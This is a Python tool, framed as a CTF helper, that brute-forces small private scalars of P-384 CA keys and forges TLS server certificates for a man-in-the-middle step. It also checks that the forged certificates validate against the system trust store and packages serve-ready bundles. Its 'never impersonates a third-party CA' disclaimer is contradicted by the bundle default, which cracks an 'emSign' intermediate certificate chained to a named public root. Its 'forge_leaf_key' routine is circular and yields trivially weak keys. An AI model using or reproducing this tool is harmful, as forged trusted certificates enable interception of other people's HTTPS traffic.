#!/usr/bin/env python3
"""
emudhra.py — CTF companion to audit.py for the ec-small-scalar class.

Demonstrates the tiny-scalar weak-keygen failure on P-384:

  forge   Generate private keys whose scalar is a small enumerable value
          (e.g. 0x73) and forge a self-signed CA-style certificate with
          each key — exactly the `openssl ec -in pk.pem -text -noout`
          artifact that started this.

  check   Take a corpus of certificates (CTF "CA" targets) and prove the
          class against them: derive k*G for k in the given scalar range
          and match the resulting public points against the certificates'
          embedded public keys. A match proves the CA's private scalar is
          enumerable in that range (i.e. the key is recoverable).

  verify  Re-check an existing PEM private key: report its scalar and
          whether it is small (the audit.py ec-small-scalar class).

  leaf    Given a CA certificate + the corresponding CA private key (i.e. a
          CA you own, e.g. your CTF's own root installed in the player's
          trust store), mint a fresh end-entity key and sign a TLS server
          certificate for the given hostnames/IPs — the cert your mitm
          step needs so the intercepted HTTPS endpoint validates.

Forge is strictly self-signed demo material — it never impersonates a real
CA. Leaf only signs with a CA key you supply; it never impersonates a
third-party CA. Check only compares public points; it recovers nothing it
wasn't given.

Run (same environment as audit.py):

  nix-shell -p 'python313.withPackages(ps: [ ps.cryptography ])' --run \
    'python3 emudhra.py forge 0x73 --out-dir evidence/emudhra'
  nix-shell -p 'python313.withPackages(ps: [ ps.cryptography ])' --run \
    'python3 emudhra.py check evidence/emudhra/targets/ --range 1:1024'
"""

from __future__ import annotations

__version__ = "1.0.0"

import argparse
import datetime
import ipaddress
import os
import sys
from typing import Optional

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

CURVE = ec.SECP384R1()
CURVE_BITS = 384


def scalar_to_key(scalar: int) -> ec.EllipticCurvePrivateKey:
    if not 1 <= scalar < 1 << CURVE_BITS:  # scalar must be in [1, n)
        raise ValueError(f"scalar {scalar} out of sane range")
    return ec.derive_private_key(scalar, CURVE)


def pub_bytes(key) -> bytes:
    pub = key.public_key() if isinstance(key, ec.EllipticCurvePrivateKey) else key
    return pub.public_bytes(
        serialization.Encoding.X962, serialization.PublicFormat.UncompressedPoint
    )


def load_certs(paths: list[str]) -> list[tuple[str, x509.Certificate]]:
    out = []
    for p in paths:
        if os.path.isdir(p):
            sub = sorted(
                os.path.join(p, f) for f in os.listdir(p) if not f.startswith(".")
            )
            out.extend(load_certs(sub))
            continue
        try:
            with open(p, "rb") as fh:
                data = fh.read()
        except OSError as e:
            print(f"  ! cannot read {p}: {e}", file=sys.stderr)
            continue
        try:
            out.append((p, x509.load_pem_x509_certificate(data)))
        except ValueError:
            try:
                out.append((p, x509.load_der_x509_certificate(data)))
            except ValueError:
                continue
    return out


# --------------------------------------------------------------- forge ----

def cmd_forge(args: argparse.Namespace) -> int:
    os.makedirs(args.out_dir, exist_ok=True)
    targets_dir = os.path.join(args.out_dir, "targets")
    os.makedirs(targets_dir, exist_ok=True)

    scalars = expand_scalars(args.scalars, args.range)
    now = datetime.datetime.now(datetime.timezone.utc)

    for scalar in scalars:
        key = scalar_to_key(scalar)
        tag = f"scalar-{scalar}"

        pk_pem = key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
        pk_path = os.path.join(args.out_dir, f"pk-{tag}.pem")
        with open(pk_path, "wb") as fh:
            fh.write(pk_pem)

        if not args.keys_only:
            name = x509.Name(
                [
                    x509.NameAttribute(NameOID.COMMON_NAME, f"CTF Demo CA {tag}"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ctf-key-audit demo"),
                ]
            )
            cert = (
                x509.CertificateBuilder()
                .subject_name(name)
                .issuer_name(name)  # self-signed demo CA, never a real CA
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + datetime.timedelta(days=1))
                .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
                .sign(key, hashes.SHA384())
            )
            cert_path = os.path.join(args.out_dir, f"cert-{tag}.pem")
            with open(cert_path, "wb") as fh:
                fh.write(cert.public_bytes(serialization.Encoding.PEM))
            # also drop a copy in targets/ so `check` can be demoed on it
            with open(os.path.join(targets_dir, f"cert-{tag}.pem"), "wb") as fh:
                fh.write(cert.public_bytes(serialization.Encoding.PEM))
            print(f"[{tag}] key={pk_path} cert={cert_path}")
        else:
            print(f"[{tag}] key={pk_path}")

    print(f"\n{len(scalars)} key(s) in {args.out_dir}")
    print("inspect with:  openssl ec -in pk-scalar-0x73.pem -text -noout")
    return 0


# --------------------------------------------------------------- check ----

def cmd_check(args: argparse.Namespace) -> int:
    certs = load_certs(args.targets)
    if not certs:
        print("no certificates found under targets", file=sys.stderr)
        return 2
    p384_certs = [
        (p, c) for p, c in certs
        if isinstance(c.public_key(), ec.EllipticCurvePublicKey)
        and c.public_key().curve.name == "secp384r1"
    ]
    print(f"{len(certs)} cert(s) loaded, {len(p384_certs)} on P-384")

    scalars = expand_scalars(args.scalars, args.range)
    table = {}
    for k in scalars:
        table.setdefault(pub_bytes(scalar_to_key(k)), k)

    hits = 0
    for path, cert in p384_certs:
        pb = pub_bytes(cert.public_key())
        if pb in table:
            k = table[pb]
            print(f"[HIT] {path}: public key == {k}*G  -> private scalar is "
                  f"0x{k:x} ({k}); key is enumerable, cert forgeable in-range")
            hits += 1
    if not hits:
        print("no target public key matched any k*G in the given range "
              "(no proof of the small-scalar class for this corpus)")
    return 0 if hits else 1


# ---------------------------------------------------------------- leaf ----

def _hash_for(ca_key) -> hashes.HashAlgorithm:
    if isinstance(ca_key, ec.EllipticCurvePrivateKey):
        size = ca_key.curve.key_size
        if size >= 512:
            return hashes.SHA512()
        if size > 384:
            return hashes.SHA384()
        return hashes.SHA256()
    return hashes.SHA256()  # RSA and friends


def load_private_key(path: str, password: Optional[bytes]):
    with open(path, "rb") as fh:
        data = fh.read()
    try:
        return serialization.load_pem_private_key(data, password=password)
    except ValueError:
        return serialization.load_der_private_key(data, password=password)


def forge_leaf_key(rng: str) -> tuple[ec.EllipticCurvePrivateKey, int]:
    """Forge-style leaf keygen, validated by the same k*G matching as `check`.

    Enumerate scalars in `rng`, derive each key, and keep the first whose
    public point matches a k*G in the range — i.e. a key the `check`
    command proves enumerable (the ec-small-scalar class).
    """
    scalars = expand_scalars(None, rng)
    table = {}
    for k in scalars:
        table.setdefault(pub_bytes(scalar_to_key(k)), k)
    for k in scalars:
        key = scalar_to_key(k)
        if pub_bytes(key) in table:  # same test as cmd_check's HIT
            return key, k
    raise SystemExit(f"no scalar in {rng} produced a check-valid key")



def generate_ca(cn: str, days: int, out_dir: str):
    """Auto-generate a P-384 self-signed root CA and persist it."""
    key = ec.generate_private_key(CURVE)
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, cn),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ctf-key-audit CA"),
    ])
    now = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=5)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=days))
        .add_extension(x509.BasicConstraints(ca=True, path_length=1), critical=True)
        .add_extension(x509.KeyUsage(
            digital_signature=True, content_commitment=False,
            key_encipherment=False, data_encipherment=False,
            key_agreement=False, key_cert_sign=True,
            crl_sign=True, encipher_only=False, decipher_only=False,
        ), critical=True)
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
            critical=False)
        .sign(key, hashes.SHA384())
    )
    key_p = os.path.join(out_dir, "ca.key.pem")
    cert_p = os.path.join(out_dir, "ca.crt.pem")
    with open(key_p, "wb") as fh:
        fh.write(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ))
    with open(cert_p, "wb") as fh:
        fh.write(cert.public_bytes(serialization.Encoding.PEM))
    return key, cert, key_p, cert_p


def crack_ca_key(ca_cert: x509.Certificate, rng: str):
    """Recover a weak CA private key from its certificate (CTF target).

    Enumerates scalars in `rng` and matches k*G against the certificate's
    embedded public point — the same test `check` uses. On a hit the CA's
    private scalar is enumerable, so the key is recovered and can sign.
    """
    pub = ca_cert.public_key()
    if not (isinstance(pub, ec.EllipticCurvePublicKey)
            and pub.curve.name == "secp384r1"):
        raise SystemExit(f"CA cert public key is not P-384 EC "
                         f"(got {type(pub).__name__}), not crackable in-range")
    target = pub_bytes(pub)
    scalars = expand_scalars(None, rng)
    print(f"[*] brute-forcing CA scalar over {len(scalars)} value(s) [{rng}] ...")
    for k in scalars:
        if pub_bytes(scalar_to_key(k)) == target:
            print(f"[HIT] CA private scalar is 0x{k:x} ({k}) — key recovered")
            return scalar_to_key(k), k
    raise SystemExit(
        f"no scalar in {rng} matched the CA public key — "
        "key not recoverable in-range (try a wider --crack range)")


def load_trust_store() -> list[x509.Certificate]:
    path = os.environ.get("SSL_CERT_FILE", "/etc/ssl/certs/ca-certificates.crt")
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except OSError:
        return []
    import warnings
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")  # old bundle entries may be RFC-impure
        try:
            return x509.load_pem_x509_certificates(data)
        except ValueError:
            return []


def build_fullchain(leaf: x509.Certificate,
                    ca_cert: Optional[x509.Certificate],
                    ca_cert_path: Optional[str],
                    extra_paths: Optional[list[str]]) -> tuple[list, Optional]:
    """Assemble leaf + intermediate chain, plus the self-signed root if found.

    Returns (chain, root): `chain` is leaf + intermediates (root excluded —
    roots are trust anchors, not wire material); `root` is the self-signed
    certificate the chain terminates at, or None if the chain is
    incomplete. Issuers are resolved from, in order: the signing CA cert,
    its sibling certs in the same directory (e.g. a cas/ hierarchy),
    --chain files, and the system trust store. Each link is verified by
    signature (verify_directly_issued_by), so same-name-different-key certs
    won't chain.
    """
    pool: list[x509.Certificate] = []
    if ca_cert is not None:
        pool.append(ca_cert)
        # auto-load sibling certs from the CA cert's directory (e.g. cas/)
        if ca_cert_path:
            ca_dir = os.path.dirname(os.path.abspath(ca_cert_path))
            for fn in sorted(os.listdir(ca_dir)):
                if not fn.endswith(".pem"):
                    continue
                try:
                    with open(os.path.join(ca_dir, fn), "rb") as fh:
                        pool.extend(x509.load_pem_x509_certificates(fh.read()))
                except (OSError, ValueError):
                    continue
    for p in extra_paths or []:
        try:
            with open(p, "rb") as fh:
                pool.extend(x509.load_pem_x509_certificates(fh.read()))
        except OSError as e:
            print(f"  ! cannot read chain file {p}: {e}", file=sys.stderr)
    pool.extend(load_trust_store())

    chain = [leaf]
    root: Optional[x509.Certificate] = None
    current = leaf
    seen = {leaf.serial_number}
    while current.issuer != current.subject:
        nxt = None
        for cand in pool:
            if cand.subject != current.issuer:
                continue
            try:
                current.verify_directly_issued_by(cand)
            except Exception:
                continue  # name matches but signature doesn't: keep looking
            nxt = cand
            break
        if nxt is None:
            print(f"  ! chain incomplete: issuer "
                  f"'{current.issuer.rfc4514_string()}' not found in "
                  f"CA cert / --chain / trust store", file=sys.stderr)
            break
        if nxt.issuer == nxt.subject:  # self-signed root: trust anchor
            root = nxt
            break
        if nxt.serial_number in seen:  # loop guard
            break
        seen.add(nxt.serial_number)
        chain.append(nxt)
        current = nxt
    return chain, root


def verify_against_store(leaf: x509.Certificate,
                         intermediates: list[x509.Certificate],
                         hostname: str) -> Optional[bool]:
    """Best-effort client-side validation of the assembled chain.

    Returns True/False, or None if the environment can't run it.
    """
    try:
        from cryptography.x509.verification import PolicyBuilder, Store
    except ImportError:
        return None
    store_certs = load_trust_store()
    if not store_certs:
        return None
    try:
        verifier = (PolicyBuilder().store(Store(store_certs))
                    .build_server_verifier(x509.DNSName(hostname)))
        verifier.verify(leaf, intermediates)
        return True
    except Exception:
        return False


LEAF_README = """\
Forged TLS leaf bundle for {cn}
================================
Issued by : {ca}
Valid until: {valid_until}

Files
-----
{server}
    single-file bundle (fullchain + key) for stacks that take one PEM
{fullchain}
    certificate chain to serve (leaf + intermediates)
{key}
    leaf private key
{p12}   PKCS#12 bundle (key + leaf + full chain incl. root), pass: {p12pass}
README.txt
    this file

Serve (openssl)
---------------
openssl s_server -accept 443 -cert {fullchain} -key {key} -www

Serve (goshs)
-------------
goshs -p 443 -s -sc {fullchain} -sk {key}

Client check (no --cacert needed if the replica root is trusted)
----------------------------------------------------------------
curl https://{cn}/ --resolve '{cn}:443:127.0.0.1'

Client check with an explicit anchor
------------------------------------
curl https://{cn}/ --resolve '{cn}:443:127.0.0.1' \\
  --cacert <replica-root-or-intermediate>.pem
"""


def cmd_bundle(args: argparse.Namespace) -> int:
    """Forge a leaf (same args as `leaf`) and package a distributable
    tarball: script + CA hierarchy + forged bundle + README."""
    import tarfile

    leaf_ns = argparse.Namespace(
        **{k: v for k, v in vars(args).items() if k not in ("func", "out", "script")})
    if cmd_leaf(leaf_ns) != 0:
        return 1

    script = os.path.abspath(args.script or __file__)
    ca_dir = os.path.dirname(os.path.abspath(args.ca_cert)) if args.ca_cert else None
    out = args.out or f"ctf-bundle-{args.cn.replace('*', 'wildcard')}.tar.gz"

    with tarfile.open(out, "w:gz") as tf:
        tf.add(script, arcname="emudhra.py")
        if ca_dir:
            tf.add(ca_dir, arcname=os.path.basename(ca_dir) or "cas")
        tf.add(args.out_dir, arcname=os.path.basename(os.path.normpath(args.out_dir)))
    print(f"\nbundle: {out}  ({os.path.getsize(out)} bytes)")
    print("contents: script + CA hierarchy + forged bundle (see README.txt)")
    return 0


def cmd_leaf(args: argparse.Namespace) -> int:
    ca_key = None
    ca_cert = None
    if args.ca_cert:
        with open(args.ca_cert, "rb") as fh:
            ca_cert = x509.load_pem_x509_certificate(fh.read())
        if args.ca_key:
            ca_key = load_private_key(
                args.ca_key, args.ca_pass.encode() if args.ca_pass else None)
            if ca_key.public_key().public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            ) != ca_cert.public_key().public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            ):
                raise SystemExit("CA key does not match CA certificate public key")
        elif args.crack:
            ca_key, _ = crack_ca_key(ca_cert, args.crack)
        else:
            raise SystemExit("--ca-cert given without --ca-key: "
                             "add --crack START:END to recover the weak CA key")
    elif args.ca_key:
        raise SystemExit("--ca-cert and --ca-key must be given together "
                         "(or omit both to auto-generate a CA)")

    # leaf key: match the CA's family, default P-384 EC for this project
    forged_scalar: Optional[int] = None
    if args.forge:
        leaf_key, forged_scalar = forge_leaf_key(args.forge)
        print(f"[forge] leaf key scalar = 0x{forged_scalar:x} ({forged_scalar}) — "
              f"check-valid in range {args.forge}")
    elif args.leaf_key:
        leaf_key = load_private_key(
            args.leaf_key, args.leaf_pass.encode() if args.leaf_pass else None)
    elif isinstance(ca_key, ec.EllipticCurvePrivateKey):
        leaf_key = ec.generate_private_key(ca_key.curve)
    else:
        from cryptography.hazmat.primitives.asymmetric import rsa
        leaf_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    names: list[x509.GeneralName] = []
    for host in args.sans:
        try:
            names.append(x509.IPAddress(ipaddress.ip_address(host)))
        except ValueError:
            names.append(x509.DNSName(host))
    if not names:  # fall back to the CN
        names.append(x509.DNSName(args.cn))

    if ca_key is None:
        os.makedirs(args.out_dir, exist_ok=True)
        ca_key, ca_cert, ca_key_p, ca_cert_p = generate_ca(
            args.ca_cn, max(args.days * 8, 30), args.out_dir)
        print(f"generated CA: key={ca_key_p} cert={ca_cert_p}")
        print("install this CA cert in the player's trust store "
              "(or point a browser/proxy at it) for the leaf to validate")

    now = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=5)
    cert = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, args.cn),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ctf-key-audit leaf"),
        ]))
        .issuer_name(ca_cert.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=args.days))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.SubjectAlternativeName(names), critical=False)
        .add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True, content_commitment=False,
                key_encipherment=True, data_encipherment=False,
                key_agreement=False, key_cert_sign=False,
                crl_sign=False, encipher_only=False, decipher_only=False,
            ), critical=True)
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(leaf_key.public_key()),
            critical=False)
        .add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
            critical=False)
        .sign(ca_key, _hash_for(ca_key))
    )

    os.makedirs(args.out_dir, exist_ok=True)
    stem = args.cn.replace("/", "_").replace("*", "wildcard")
    if forged_scalar is not None:
        stem += f"-scalar-{forged_scalar}"
    key_path = os.path.join(args.out_dir, f"{stem}.key.pem")
    cert_path = os.path.join(args.out_dir, f"{stem}.crt.pem")
    with open(key_path, "wb") as fh:
        fh.write(leaf_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ))
    with open(cert_path, "wb") as fh:
        fh.write(cert.public_bytes(serialization.Encoding.PEM))

    signed_by = args.ca_cert or os.path.join(args.out_dir, "ca.crt.pem")
    print(f"leaf key : {key_path}")
    print(f"leaf cert: {cert_path}  (signed by {signed_by})")
    chain, chain_root = build_fullchain(cert, ca_cert, args.ca_cert, args.chain)
    full_path = os.path.join(args.out_dir, f"{stem}.fullchain.pem")
    with open(full_path, "wb") as fh:
        for c in chain:
            fh.write(c.public_bytes(serialization.Encoding.PEM))
    key_pem = open(key_path, "rb").read()
    srv_path = os.path.join(args.out_dir, f"{stem}.server.pem")
    with open(srv_path, "wb") as fh:
        fh.write(open(full_path, "rb").read())
        fh.write(key_pem)
    p12_pass = args.p12_pass or "emudhra"
    p12_path = os.path.join(args.out_dir, f"{stem}.p12")
    with open(p12_path, "wb") as fh:
        from cryptography.hazmat.primitives.serialization import pkcs12
        fh.write(pkcs12.serialize_key_and_certificates(
            name=args.cn.encode(), key=leaf_key, cert=cert,
            cas=chain[1:] + ([chain_root] if chain_root is not None else []),
            encryption_algorithm=serialization.BestAvailableEncryption(
                p12_pass.encode())))
    print(f"fullchain: {full_path} ({len(chain)} cert(s): leaf + "
          f"{len(chain) - 1} intermediate(s))")
    print(f"server pem: {srv_path} (fullchain + key, single file)")
    print(f"pkcs12    : {p12_path} (pass: {p12_pass!r})")
    ok = verify_against_store(cert, chain[1:], args.cn)
    if ok is True:
        print("chain check: VALIDATES against the system trust store "
              "(zero client flags needed)")
    elif ok is False:
        print("chain check: does NOT validate against the system trust "
              "store (install the root, or clients must pass --cacert)")

    readme = os.path.join(args.out_dir, "README.txt")
    with open(readme, "w") as fh:
        fh.write(LEAF_README.format(
            cn=args.cn, fullchain=os.path.basename(full_path),
            key=os.path.basename(key_path), server=os.path.basename(srv_path),
            p12=os.path.basename(p12_path), p12pass=p12_pass,
            ca=args.ca_cert or "auto-generated CA",
            valid_until=cert.not_valid_after_utc.date()))
    print("usage notes: README.txt")
    print("sanity check:")
    print(f"  openssl verify -CAfile {signed_by} {cert_path}")
    print(f"  openssl x509 -in {cert_path} -text -noout | grep -A1 'Alternative'")
    return 0


# -------------------------------------------------------------- verify ----

def cmd_verify(args: argparse.Namespace) -> int:
    rc = 0
    for path in args.keys:
        try:
            with open(path, "rb") as fh:
                data = fh.read()
        except OSError as e:
            print(f"{path}: cannot read: {e}", file=sys.stderr)
            rc = 1
            continue
        key = None
        try:
            key = serialization.load_pem_private_key(data, password=None)
        except (ValueError, TypeError):
            try:
                key = serialization.load_der_private_key(data, password=None)
            except (ValueError, TypeError):
                pass
        if key is None:
            what = "a certificate" if _looks_like_cert(data) else "not a private key"
            print(f"{path}: {what} (expected a PEM/DER private key)")
            rc = 1
            continue
        if not isinstance(key, ec.EllipticCurvePrivateKey):
            print(f"{path}: not an EC key ({type(key).__name__})")
            continue
        n = key.private_numbers()
        print(f"{path}: curve={n.public_numbers.curve.name} "
              f"scalar=0x{n.private_value:x} ({n.private_value})")
        if n.private_value.bit_length() <= args.small_bits:
            print(f"  SMALL SCALAR (<= {args.small_bits} bits) — audit.py class "
                  f"'ec-small-scalar-priv', CRITICAL")
    return rc


def _looks_like_cert(data: bytes) -> bool:
    return (b"-----BEGIN CERTIFICATE-----" in data
            or b"\x30\x82" == data[:2] if data else False)


# ----------------------------------------------------------------- util ----

def expand_scalars(scalars: Optional[list[str]], rng: Optional[str]) -> list[int]:
    out: list[int] = []
    if scalars:
        for s in scalars:
            out.append(int(s, 0))  # accepts 0x73, 115, 0o163
    if rng:
        lo, _, hi = rng.partition(":")
        lo_i, hi_i = int(lo, 0), int(hi, 0)
        if hi_i - lo_i > 1_000_000:
            raise SystemExit("range too large (max 1,000,000 points)")
        out.extend(range(lo_i, hi_i + 1))
    out = sorted(set(out))
    if not out:
        raise SystemExit("no scalars: pass --scalar and/or --range start:end")
    return out


def main(argv: Optional[list[str]] = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("forge", help="generate small-scalar keys + demo certs")
    p.add_argument("scalars", nargs="*", help="scalar values (0x73, 4, ...)")
    p.add_argument("--range", help="inclusive range like 1:256 or 0x1:0x100")
    p.add_argument("--out-dir", default="evidence/emudhra")
    p.add_argument("--keys-only", action="store_true",
                   help="skip certificate forging")
    p.set_defaults(func=cmd_forge)

    p = sub.add_parser("check", help="match k*G against target CA certificates")
    p.add_argument("targets", nargs="+", help="cert file(s) or directory(ies)")
    p.add_argument("--scalar", action="append", help="single scalar to test")
    p.add_argument("--range", default="1:1024",
                   help="scalar range to enumerate (default 1:1024)")
    p.set_defaults(func=cmd_check)

    def add_leaf_args(p):
        p.add_argument("--ca-cert", help="CA certificate (PEM); omit to auto-generate")
        p.add_argument("--ca-key", help="CA private key (PEM); omit to auto-generate")
        p.add_argument("--ca-cn", default="CTF Auto CA",
                       help="CN for an auto-generated CA (default 'CTF Auto CA')")
        p.add_argument("--chain", action="append",
                       help="PEM file with issuer certs (e.g. the parent CA "
                            "pulled from the endpoint's served chain); "
                            "repeatable. Siblings of --ca-cert are picked "
                            "up automatically from its directory.")
        p.add_argument("--ca-pass", help="passphrase for the CA key (prompt-free)")
        p.add_argument("--crack", metavar="START:END",
                       help="given --ca-cert only: brute-force the CA's private "
                            "scalar over the range (check-style k*G matching) "
                            "and sign the leaf with the recovered CA key")
        p.add_argument("--cn", required=True, help="common name, e.g. ctf.example")
        p.add_argument("--san", dest="sans", action="append", default=[],
                       help="SAN entry (DNS name or IP); repeatable. "
                            "Defaults to the CN.")
        p.add_argument("--leaf-key", help="reuse an existing leaf key (PEM) "
                                          "instead of generating one")
        p.add_argument("--leaf-pass", help="passphrase for --leaf-key")
        p.add_argument("--forge", metavar="START:END",
                       help="forge-style leaf keygen: enumerate scalars in the "
                            "range (e.g. 1:1024) and keep the first leaf key "
                            "whose public point matches k*G — the same test "
                            "`check` uses to prove the key enumerable")
        p.add_argument("--days", type=int, default=7, help="validity in days (default 7)")
        p.add_argument("--out-dir", default=None,
                       help="output dir (default: certs/<cn>)")
        p.add_argument("--p12-pass", default=None,
                       help="PKCS#12 password (default: 'emudhra'); the .p12 "
                            "bundles key + leaf + full chain incl. root")

    p = sub.add_parser(
        "leaf", help="sign a TLS server cert with a CA you own (mitm step); "
                     "emits a serve-ready bundle")
    add_leaf_args(p)
    p.set_defaults(func=cmd_leaf)

    p = sub.add_parser("bundle", help="forge a leaf and package script + CA "
                                      "hierarchy + bundle as a tar.gz")
    add_leaf_args(p)
    p.add_argument("--out", help="archive path (default: ctf-bundle-<cn>.tar.gz)")
    p.add_argument("--script", help="path to this script to include "
                                    "(default: the running file)")
    p.set_defaults(func=cmd_bundle)

    p = sub.add_parser("verify", help="report the scalar of a PEM private key")
    p.add_argument("keys", nargs="+")
    p.add_argument("--small-bits", type=int, default=16)
    p.set_defaults(func=cmd_verify)

    args = ap.parse_args(argv)
    if args.cmd == "forge":
        args.scalars = args.scalars or None
    if args.cmd == "check":
        args.scalars = getattr(args, "scalar", None)
    if args.cmd in ("leaf", "bundle") and args.out_dir is None:
        args.out_dir = f"certs/{args.cn.replace('*', 'wildcard')}"
    if args.cmd == "bundle" and not args.ca_cert and not args.ca_key:
        # default: forge under the weak emSign hierarchy, anchored at the
        # emSign ECC Root CA (root key is strong and stays untouched)
        default_ca = "cas/EM-DV-TLS-CA-G3B.crt.pem"
        if os.path.exists(default_ca):
            args.ca_cert = default_ca
            args.crack = args.crack or "1:1000"
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
